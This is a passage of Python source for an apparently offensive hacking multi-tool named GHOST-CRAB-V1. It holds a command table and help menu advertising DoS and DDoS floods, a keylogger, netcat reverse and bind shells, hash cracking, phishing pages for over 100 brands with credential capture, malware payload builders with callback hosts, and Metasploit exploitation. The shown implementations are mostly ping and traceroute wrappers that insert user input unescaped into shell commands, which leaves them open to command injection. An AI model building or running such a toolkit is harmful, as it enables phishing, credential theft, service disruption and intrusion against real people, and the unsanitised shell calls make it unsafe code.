            # ==================== Netcat Commands ====================
            'netcat': self._netcat,
            'nc': self._netcat,
            'nc_listen': self._nc_listen,
            'nc_scan': self._nc_scan,
            'nc_transfer': self._nc_transfer,
            'nc_shell': self._nc_shell,
            'nc_reverse_shell': self._nc_reverse_shell,
            'nc_bind_shell': self._nc_bind_shell,
            'nc_chat': self._nc_chat,
            'nc_file_transfer': self._nc_file_transfer,
            
            # ==================== SSH Commands ====================
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            'ssh_upload': self._ssh_upload,
            'ssh_download': self._ssh_download,
            
            # ==================== Traffic Generation ====================
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            
            # ==================== DOS Attacks ====================
            'dos_syn': self._dos_syn,
            'dos_udp': self._dos_udp,
            'dos_http': self._dos_http,
            'dos_icmp': self._dos_icmp,
            'dos_slowloris': self._dos_slowloris,
            'dos_stop': self._dos_stop,
            'dos_status': self._dos_status,
            'ddos_syn': self._ddos_syn,
            'ddos_udp': self._ddos_udp,
            'ddos_http': self._ddos_http,
            'ddos_icmp': self._ddos_icmp,
            'ddos_stop': self._ddos_stop,
            'ddos_status': self._ddos_status,
            
            # ==================== Keylogger ====================
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            'keylogger_clipboard': self._keylogger_clipboard,
            
            # ==================== Cracking ====================
            'crack': self._crack,
            'crack_status': self._crack_status,
            'crack_list': self._crack_list,
            'crack_md5': self._crack_md5,
            'crack_sha1': self._crack_sha1,
            'crack_sha256': self._crack_sha256,
            'crack_sha512': self._crack_sha512,
            'crack_ntlm': self._crack_ntlm,
            'crack_bcrypt': self._crack_bcrypt,
            'crack_all': self._crack_all,
            
            # ==================== Docker ====================
            'docker_scan': self._docker_scan,
            'docker_info': self._docker_info,
            'docker_ps': self._docker_ps,
            'docker_images': self._docker_images,
            'docker_bench': self._docker_bench,
            'docker_audit': self._docker_audit,
            'docker_compliance': self._docker_compliance,
            
            # ==================== Reverse Engineering ====================
            're_strings': self._re_strings,
            're_hexdump': self._re_hexdump,
            're_disassemble': self._re_disassemble,
            're_decompile': self._re_decompile,
            're_decode': self._re_decode,
            're_metadata': self._re_metadata,
            're_extract': self._re_extract,
            're_analyze': self._re_analyze,
            're_list': self._re_list,
            
            # ==================== IP Management ====================
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'show_all_ips': self._show_all_ips,
            'monitor_ip': self._monitor_ip,
            'scan_all_added_IP': self._scan_all_added_ip,
            'scan_all_added_ips': self._scan_all_added_ip,
            'ip_info': self._ip_info,
            'analyze_ip': self._analyze_ip,
            
            # ==================== Network Commands ====================
            'whois': self._whois,
            'dns': self._dns,
            'dig': self._dig,
            'nslookup': self._nslookup,
            'location': self._location,
            'scan': self._scan,
            'quick_scan': self._quick_scan,
            'full_scan': self._full_scan,
            'ip_to_domain': self._ip_to_domain,
            'domain_to_ip': self._domain_to_ip,
            
            # ==================== Domain Hosting ====================
            'host_domain': self._host_domain,
            'host_website': self._host_website,
            'list_domains': self._list_domains,
            'domain_info': self._domain_info,
            
            # ==================== Social Engineering (100+ templates) ====================
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            'phish_list': self._phish_list,
            'phish_templates': self._phish_templates,
            'phish_custom': self._phish_custom,
            
            # ==================== Payload Commands ====================
            'payload_exe': self._payload_exe,
            'payload_pdf': self._payload_pdf,
            'payload_docx': self._payload_docx,
            'payload_link': self._payload_link,
            'payload_network': self._payload_network,
            'payload_image': self._payload_image,
            'payload_list': self._payload_list,
            'payload_deploy': self._payload_deploy,
            
            # ==================== Report Commands ====================
            'report_pdf': self._report_pdf,
            'report_json': self._report_json,
            'report_both': self._report_both,
            'report_list': self._report_list,
            'report_chart': self._report_chart,
            
            # ==================== Metasploit ====================
            'msf_search': self._msf_search,
            'msf_exploit': self._msf_exploit,
            'msf_sessions': self._msf_sessions,
            'msf_payload': self._msf_payload,
            'msf_console': self._msf_console,
            'msf_db_status': self._msf_db_status,
            'msf_workspace': self._msf_workspace,
            'msf_scan': self._msf_scan,
            'msf_auxiliary': self._msf_auxiliary,
            'msf_post': self._msf_post,
            'msf_handler': self._msf_handler,
            
            # ==================== SaaS Commands ====================
            'saas_create_tenant': self._saas_create_tenant,
            'saas_list_tenants': self._saas_list_tenants,
            'saas_tenant_info': self._saas_tenant_info,
            'saas_create_api_key': self._saas_create_api_key,
            'saas_verify_api_key': self._saas_verify_api_key,
            'saas_stats': self._saas_stats,
        }
        
        # Add all phishing templates as commands
        for template_name in self.social.templates.keys():
            commands[f'phish_{template_name}'] = lambda _, t=template_name: self._phish(t)
        
        return commands
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        """Execute a command"""
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    def _generic(self, command: str) -> Dict:
        """Execute generic command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    # ==================== System Commands ====================
    
    def _help(self, args: List[str]) -> Dict:
        """Show help menu"""
        help_text = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.WHITE}        👻 GHOST-CRAB-V1 v{VERSION} - HELP MENU                          {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}📡 PING COMMANDS:{Colors.RESET}
║  ping <target> [count]         - Ping a target
║  ping6 <target>                - IPv6 ping
║  ping_sweep <network>          - Ping sweep entire network
║  fping <targets...>            - Fast ping multiple targets
║  ping_flood <target>           - Flood ping
║  ping_mtu <target> <size>      - Ping with MTU
║  ping_size <target> <size>     - Ping with packet size
║  ping_count <target> <count>   - Ping with count
║  ping_interval <target> <sec>  - Ping with interval
║  ping_timeout <target> <sec>   - Ping with timeout
║  ping_ttl <target> <ttl>       - Ping with TTL
║  ping_interface <target> <if>  - Ping with interface
║  ping_source <target> <ip>     - Ping with source IP
║  ping_pattern <target> <pat>   - Ping with pattern
║  ping_record <target>          - Ping with record route
║  ping_timestamp <target>       - Ping with timestamps
║  ping_quiet <target>           - Quiet ping
║  ping_verbose <target>         - Verbose ping
║  ping_numeric <target>         - Numeric output
║  ping_deadline <target> <sec>  - Deadline ping
║  ping_adaptive <target>        - Adaptive ping
║  ping_audible <target>         - Audible ping
║
║{Colors.SUCCESS}🔍 TRACEROUTE COMMANDS:{Colors.RESET}
║  traceroute <target>           - Trace route
║  tracert <target>              - Windows traceroute
║  tracepath <target>            - Tracepath
║  traceroute6 <target>          - IPv6 trace route
║  traceroute_tcp <target>       - TCP traceroute
║  traceroute_udp <target>       - UDP traceroute
║  traceroute_icmp <target>      - ICMP traceroute
║  traceroute_max_hops <t> <n>   - Max hops
║  traceroute_first_hop <t> <n>  - First hop
║  traceroute_queries <t> <n>    - Queries per hop
║  traceroute_wait <t> <sec>     - Wait time
║  traceroute_port <t> <port>    - Port
║  traceroute_numeric <target>   - Numeric output
║  traceroute_verbose <target>   - Verbose
║  traceroute_debug <target>     - Debug
║  traceroute_dont_fragment <t>  - Don't fragment
║  traceroute_interface <t> <if> - Interface
║  traceroute_source <t> <ip>    - Source IP
║  traceroute_tos <t> <tos>      - TOS
║  traceroute_as_lookup <target> - AS lookup
║  mtr <target>                  - MTR traceroute
║  mtr_report <target>           - MTR report
║  mtr_json <target>             - MTR JSON
║  mtr_csv <target>              - MTR CSV
║  mtr_xml <target>              - MTR XML
║  mtr_raw <target>              - MTR raw
║  tcptraceroute <target>        - TCP traceroute
║  lft <target>                  - Layer Four Traceroute
║
║{Colors.SUCCESS}🔍 NMAP COMMANDS:{Colors.RESET}
║  nmap <target> [options]       - Run nmap scan
║  nmap_quick <target>           - Quick port scan
║  nmap_full <target>            - Full port scan
║  nmap_os <target>              - OS detection
║  nmap_service <target>         - Service detection
║  nmap_udp <target>             - UDP scan
║  nmap_vuln <target>            - Vulnerability scan
║  nmap_stealth <target>         - Stealth scan
║  nmap_ping <target>            - Ping scan
║  nmap_ports <target> <ports>   - Port range
║  nmap_script <target> <script> - NSE script
║  nmap_aggressive <target>      - Aggressive scan
║  nmap_traceroute <target>      - Traceroute
║  nmap_output <target> <file>   - Output file
║  nmap_exclude <target> <ex>    - Exclude hosts
║  nmap_exclude_file <target> <f>- Exclude file
║  nmap_input <file>             - Input file
║  nmap_random <count>           - Random targets
║  nmap_timing <target> <level>  - Timing template
║  nmap_version                  - Version
║  nmap_help                     - Help
║  nmap_syn <target>             - SYN scan
║  nmap_connect <target>         - Connect scan
║  nmap_ack <target>             - ACK scan
║  nmap_fin <target>             - FIN scan
║  nmap_xmas <target>            - XMAS scan
║  nmap_null <target>            - NULL scan
║  nmap_script_default <target>  - Default scripts
║  nmap_top_ports <t> <count>    - Top ports
║  nmap_open <target>            - Open ports only
║  nmap_reason <target>          - Show reasons
║  nmap_packet_trace <target>    - Packet trace
║  nmap_iflist                   - List interfaces
║  nmap_no_ping <target>         - Skip discovery
║  nmap_fast <target>            - Fast scan
║  nmap_fragment <target>        - Fragment
║  nmap_decoys <t> <count>       - Decoys
║  nmap_source_port <t> <port>   - Source port
║  nmap_data_length <t> <len>    - Data length
║  nmap_ttl <t> <ttl>            - Set TTL
║  nmap_spoof_mac <t> <mac>      - Spoof MAC
║  nmap_badsum <target>          - Bad checksum
║  nmap_send_eth <target>        - Send ethernet
║  nmap_send_ip <target>         - Send IP
║
║{Colors.SUCCESS}🌐 CURL COMMANDS:{Colors.RESET}
║  curl <url>                    - Basic request
║  curl_get <url>                - GET request
║  curl_post <url> <data>        - POST request
║  curl_put <url> <data>         - PUT request
║  curl_delete <url>             - DELETE request
║  curl_patch <url> <data>       - PATCH request
║  curl_head <url>               - HEAD request
║  curl_options <url>            - OPTIONS request
║  curl_output <url> <file>      - Output file
║  curl_location <url>           - Follow redirects
║  curl_include <url>            - Include headers
║  curl_verbose <url>            - Verbose
║  curl_silent <url>             - Silent
║  curl_insecure <url>           - Skip SSL
║  curl_data <url> <data>        - POST data
║  curl_data_binary <u> <file>   - Binary data
║  curl_data_urlencode <u> <d>   - URL encode
║  curl_header <url> <header>    - Custom header
║  curl_user_agent <url> <ua>    - User agent
║  curl_user <url> <user:pass>   - Basic auth
║  curl_cookie <url> <cookie>    - Cookie
║  curl_proxy <url> <proxy>      - Proxy
║  curl_cert <url> <cert>        - Client cert
║  curl_tlsv1_2 <url>            - TLS 1.2
║  curl_tlsv1_3 <url>            - TLS 1.3
║  curl_range <url> <range>      - Range
║  curl_limit_rate <u> <rate>    - Limit rate
║  curl_max_time <u> <sec>       - Max time
║  curl_retry <url> <count>      - Retry
║  curl_ipv4 <url>               - IPv4
║  curl_ipv6 <url>               - IPv6
║  curl_http2 <url>              - HTTP/2
║  curl_compressed <url>         - Compressed
║  curl_json <url> <json>        - JSON POST
║  curl_help                     - Help
║  curl_version                  - Version
║
║{Colors.SUCCESS}⬇️ WGET COMMANDS:{Colors.RESET}
║  wget <url> [output]           - Basic download
║  wget_output <url> <file>      - Output file
║  wget_continue <url>           - Resume
║  wget_background <url>         - Background
║  wget_quiet <url>              - Quiet
║  wget_recursive <url>          - Recursive
║  wget_mirror <url>             - Mirror
║  wget_spider <url>             - Spider
║  wget_input <file>             - Input file
║  wget_header <url> <header>    - Custom header
║  wget_user_agent <url> <ua>    - User agent
║  wget_cookies <url> <file>     - Load cookies
║  wget_save_cookies <u> <file>  - Save cookies
║  wget_limit_rate <u> <rate>    - Limit rate
║  wget_timeout <url> <sec>      - Timeout
║  wget_tries <url> <count>      - Retries
║  wget_retry <url>              - Retry
║  wget_no_check_cert <url>      - Skip SSL
║  wget_proxy <url> <proxy>      - Proxy
║  wget_user <url> <user>        - User
║  wget_password <url> <pass>    - Password
║  wget_post_data <url> <data>   - POST data
║  wget_method <url> <method>    - Method
║  wget_timestamping <url>       - Timestamping
║  wget_no_clobber <url>         - No clobber
║  wget_progress <url>           - Progress bar
║  wget_help                     - Help
║  wget_version                  - Version
║
║{Colors.SUCCESS}🔌 NETCAT COMMANDS:{Colors.RESET}
║  netcat <host> <port> [cmd]    - Netcat
║  nc <host> <port> [cmd]        - Netcat alias
║  nc_listen <port>              - Listen on port
║  nc_scan <host> <ports>        - Port scan
║  nc_transfer <host> <port> <file> - File transfer
║  nc_shell <host> <port>        - Shell
║  nc_reverse_shell <host> <port> - Reverse shell
║  nc_bind_shell <port>          - Bind shell
║  nc_chat <host> <port>         - Chat
║  nc_file_transfer <h> <p> <f>  - File transfer
║
║{Colors.SUCCESS}🔒 SSH COMMANDS:{Colors.RESET}
║  ssh_add <name> <host> <user> [pass] - Add SSH
║  ssh_list                      - List SSH
║  ssh_connect <conn_id>         - Connect
║  ssh_exec <conn_id> <command>  - Execute
║  ssh_disconnect <conn_id>      - Disconnect
║  ssh_upload <conn_id> <local> <remote> - Upload
║  ssh_download <conn_id> <remote> <local> - Download
║
║{Colors.SUCCESS}🚀 TRAFFIC GENERATION:{Colors.RESET}
║  traffic <type> <ip> <duration> [port] [rate] - Generate
║  traffic_types                 - List types
║  traffic_stop [id]             - Stop
║  traffic_status                - Status
║
║{Colors.SUCCESS}💥 DOS ATTACKS:{Colors.RESET}
║  dos_syn <ip> <port> <duration> [threads] - SYN flood
║  dos_udp <ip> <port> <duration> [threads] - UDP flood
║  dos_http <ip> <port> <duration> [threads] - HTTP flood
║  dos_icmp <ip> <duration> [threads] - ICMP flood
║  dos_slowloris <ip> <port> <duration> - Slowloris
║  dos_stop [id]                - Stop attack
║  dos_status                    - Status
║  ddos_syn <ip> <port> <duration> [threads] - DDoS SYN
║  ddos_udp <ip> <port> <duration> [threads] - DDoS UDP
║  ddos_http <ip> <port> <duration> [threads] - DDoS HTTP
║  ddos_icmp <ip> <duration> [threads] - DDoS ICMP
║  ddos_stop [id]               - Stop DDoS
║  ddos_status                  - DDoS status
║
║{Colors.SUCCESS}⌨️ KEYLOGGER:{Colors.RESET}
║  keylogger_start               - Start (F10 to stop)
║  keylogger_stop                - Stop
║  keylogger_status              - Status
║  keylogger_logs [limit]        - View logs
║  keylogger_screenshots         - View screenshots
║  keylogger_clipboard [limit]   - View clipboard
║
║{Colors.SUCCESS}🔓 CRACKING:{Colors.RESET}
║  crack <type> <hash> [wordlist] - Start cracking
║  crack_status <job_id>         - Check status
║  crack_list                    - List jobs
║  crack_md5 <hash>              - Crack MD5
║  crack_sha1 <hash>             - Crack SHA1
║  crack_sha256 <hash>           - Crack SHA256
║  crack_sha512 <hash>           - Crack SHA512
║  crack_ntlm <hash>             - Crack NTLM
║  crack_bcrypt <hash>           - Crack bcrypt
║  crack_all <hash>              - Try all hash types
║
║{Colors.SUCCESS}🐳 DOCKER:{Colors.RESET}
║  docker_scan <image>           - Scan image
║  docker_info                   - Docker info
║  docker_ps                     - List containers
║  docker_images                 - List images
║  docker_bench                  - Docker Bench Security
║  docker_audit                  - Full Docker audit
║  docker_compliance             - Compliance check
║
║{Colors.SUCCESS}🔬 REVERSE ENGINEERING:{Colors.RESET}
║  re_strings <file> [min_len]   - Extract strings
║  re_hexdump <file> [offset] [len] - Hex dump
║  re_disassemble <file>         - Disassemble
║  re_decompile <file>           - Decompile
║  re_decode <data> <encoding>   - Decode obfuscated data
║  re_metadata <file>            - File metadata
║  re_extract <file>             - Extract embedded files
║  re_analyze <file>             - Complete analysis
║  re_list                       - List RE jobs
║
║{Colors.SUCCESS}🔒 IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]           - Add IP
║  remove_ip <ip>                - Remove IP
║  block_ip <ip> [reason]        - Block IP
║  unblock_ip <ip>               - Unblock IP
║  list_ips [active]             - List IPs
║  show_all_ips                  - Show all managed IPs
║  monitor_ip <ip> [interval]    - Monitor IP
║  scan_all_added_IP             - Scan all managed IPs
║  ip_info <ip>                  - IP information
║  analyze_ip <ip>               - Complete IP analysis
║
║{Colors.SUCCESS}🎣 SOCIAL ENGINEERING (100+ Templates):{Colors.RESET}
║  phish_facebook                - Facebook phishing
║  phish_instagram               - Instagram phishing
║  phish_twitter                 - Twitter/X phishing
║  phish_linkedin                - LinkedIn phishing
║  phish_gmail                   - Gmail phishing
║  phish_microsoft               - Microsoft phishing
║  phish_google                  - Google phishing
║  phish_apple                   - Apple phishing
║  phish_paypal                  - PayPal phishing
║  phish_amazon                  - Amazon phishing
║  phish_netflix                 - Netflix phishing
║  phish_spotify                 - Spotify phishing
║  phish_whatsapp                - WhatsApp phishing
║  phish_telegram                - Telegram phishing
║  phish_discord                 - Discord phishing
║  ... and 85+ more templates
║  phish_templates               - List all templates
║  phish_custom <name> <platform> <html_file> - Custom template
║  phish_start <link_id> [port]  - Start server
║  phish_stop                    - Stop server
║  phish_creds [link_id]         - View credentials
║  phish_list                    - List links
║
║{Colors.SUCCESS}📦 PAYLOAD COMMANDS:{Colors.RESET}
║  payload_exe <name> [callback_host] [callback_port] - EXE payload
║  payload_pdf <name> [callback_host] [callback_port] - PDF payload
║  payload_docx <name> [callback_host] [callback_port] - DOCX payload
║  payload_link <name> [url]     - Link payload
║  payload_network <name> <target_ip> [port] [type] - Network payload
║  payload_image <name> <malware_type> [image_path] - Image payload
║  payload_list [type]           - List payloads
║  payload_deploy <id> <type> [target] - Deploy payload
║
║{Colors.SUCCESS}📊 REPORT COMMANDS:{Colors.RESET}
║  report_pdf <target>           - Generate PDF report
║  report_json <target>          - Generate JSON report
║  report_both <target>          - Generate both reports
║  report_list                   - List reports
║  report_chart <target> [type]  - Generate chart
║
║{Colors.SUCCESS}💀 METASPLOIT:{Colors.RESET}
║  msf_search <query>            - Search modules
║  msf_exploit <exploit> <target> <port> [payload] - Run exploit
║  msf_sessions                  - List sessions
║  msf_payload <payload_name>    - Show payload options
║  msf_console                   - Console info
║  msf_db_status                 - DB status
║  msf_workspace [name]          - Workspace
║  msf_scan <target>             - DB scan
║  msf_auxiliary <module>        - Auxiliary module
║  msf_post <module> <session>   - Post module
║  msf_handler <payload> <lhost> <lport> - Handler
║
║{Colors.SUCCESS}☁️ SAAS COMMANDS:{Colors.RESET}
║  saas_create_tenant <name> <email> [tier] - Create tenant
║  saas_list_tenants             - List tenants
║  saas_tenant_info <tenant_id>  - Tenant info
║  saas_create_api_key <tenant_id> <name> - Create API key
║  saas_verify_api_key <key>     - Verify API key
║  saas_stats                    - SaaS statistics
║
║{Colors.SUCCESS}📊 SYSTEM COMMANDS:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System information
║  threats [limit]               - Recent threats
║  clear                         - Clear screen
║  version                       - Version
║  stats                         - Statistics
║  help                          - This help menu
║
║{Colors.WARNING}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}
    
    def _status(self, args: List[str]) -> Dict:
        """Show system status"""
        stats = self.db.get_statistics()
        output = f"""
{Colors.PRIMARY}👻 GHOST-CRAB-V1 System Status{Colors.RESET}
{'='*50}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  Domain Hosts: {stats.get('total_domain_hosts', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DOS Attacks: {stats.get('total_dos_attacks', 0)}
  Deployments: {stats.get('total_deployments', 0)}
  Docker Scans: {stats.get('total_docker_scans', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
  RE Jobs: {stats.get('total_re_jobs', 0)}
  Tenants: {stats.get('total_tenants', 0)}
  Malware Payloads: {stats.get('total_malware_payloads', 0)}
  Image Payloads: {stats.get('total_image_payloads', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {self.tools.get_local_ip()}
  Public IP: {self.tools.get_public_ip() or 'Unknown'}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        """Show command history"""
        limit = int(args[0]) if args and args[0].isdigit() else 20
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        """Show system information"""
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args: List[str]) -> Dict:
        """Show recent threats"""
        limit = int(args[0]) if args and args[0].isdigit() else 10
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _clear(self, args: List[str]) -> Dict:
        """Clear screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _version(self, args: List[str]) -> Dict:
        """Show version"""
        return {'success': True, 'output': f"GHOST-CRAB-V1 v{VERSION}\nAuthor: {AUTHOR}\n{TOTAL_LINES}+ lines of code"}
    
    def _stats(self, args: List[str]) -> Dict:
        """Show statistics"""
        return self._status(args)
    
    # ==================== Ping Commands ====================
    
    def _ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result.success, 'output': result.output}
    
    def _ping6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping6 <target>'}
        return self._generic(f'ping6 -c 4 {args[0]}')
    
    def _ping_sweep(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_sweep <network> (e.g., 192.168.1.0/24)'}
        return self._generic(f'nmap -sn {args[0]}')
    
    def _fping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: fping <targets...>'}
        return self._generic(f'fping {" ".join(args)}')
    
    def _ping_flood(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_flood <target>'}
        return self._generic(f'ping -f {args[0]}')
    
    def _ping_mtu(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_mtu <target> <size>'}
        return self._generic(f'ping -M do -s {args[1]} {args[0]}')
    
    def _ping_size(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_size <target> <size>'}
        return self._generic(f'ping -s {args[1]} {args[0]}')
    
    def _ping_count(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_count <target> <count>'}
        return self._generic(f'ping -c {args[1]} {args[0]}')
    
    def _ping_interval(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_interval <target> <interval>'}
        return self._generic(f'ping -i {args[1]} {args[0]}')
    
    def _ping_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_timeout <target> <timeout>'}
        return self._generic(f'ping -W {args[1]} {args[0]}')
    
    def _ping_ttl(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_ttl <target> <ttl>'}
        return self._generic(f'ping -t {args[1]} {args[0]}')
    
    def _ping_interface(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_interface <target> <interface>'}
        return self._generic(f'ping -I {args[1]} {args[0]}')
    
    def _ping_source(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_source <target> <source_ip>'}
        return self._generic(f'ping -S {args[1]} {args[0]}')
    
    def _ping_pattern(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_pattern <target> <pattern>'}
        return self._generic(f'ping -p {args[1]} {args[0]}')
    
    def _ping_record(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_record <target>'}
        return self._generic(f'ping -R {args[0]}')
    
    def _ping_timestamp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_timestamp <target>'}
        return self._generic(f'ping -D {args[0]}')
    
    def _ping_quiet(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_quiet <target>'}
        return self._generic(f'ping -q -c 5 {args[0]}')
    
    def _ping_verbose(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_verbose <target>'}
        return self._generic(f'ping -v {args[0]}')
    
    def _ping_numeric(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_numeric <target>'}
        return self._generic(f'ping -n {args[0]}')
    
    def _ping_deadline(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_deadline <target> <seconds>'}
        return self._generic(f'ping -w {args[1]} {args[0]}')
    
    def _ping_adaptive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_adaptive <target>'}
        return self._generic(f'ping -A {args[0]}')
    
    def _ping_audible(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_audible <target>'}
        return self._generic(f'ping -a {args[0]}')
    
    # ==================== Traceroute Commands ====================
    
    def _traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        result = self.tools.traceroute(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _tracepath(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: tracepath <target>'}
        return self._generic(f'tracepath {args[0]}')
    
    def _traceroute6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute6 <target>'}
        return self._generic(f'traceroute6 {args[0]}')
    
    def _traceroute_tcp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_tcp <target>'}
        return self._generic(f'traceroute -T {args[0]}')
    
    def _traceroute_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_udp <target>'}
        return self._generic(f'traceroute -U {args[0]}')
    
    def _traceroute_icmp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_icmp <target>'}
        return self._generic(f'traceroute -I {args[0]}')
    
    def _traceroute_max_hops(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_max_hops <target> <hops>'}
        return self._generic(f'traceroute -m {args[1]} {args[0]}')
    
    def _traceroute_first_hop(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_first_hop <target> <hop>'}
        return self._generic(f'traceroute -f {args[1]} {args[0]}')
    
    def _traceroute_queries(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_queries <target> <queries>'}
        return self._generic(f'traceroute -q {args[1]} {args[0]}')
    
    def _traceroute_wait(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_wait <target> <seconds>'}
        return self._generic(f'traceroute -w {args[1]} {args[0]}')
    
    def _traceroute_port(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_port <target> <port>'}
